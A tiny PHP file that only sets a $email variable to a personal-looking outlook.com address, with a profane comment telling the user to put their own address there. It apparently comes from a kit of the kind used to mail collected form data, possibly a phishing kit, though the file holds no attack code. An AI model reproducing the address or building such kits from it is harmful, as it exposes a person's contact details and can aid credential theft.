<?php

$email = "nastuf.steph@outlook.com"; // PUT UR FUCKING E-MAIL BRO

?>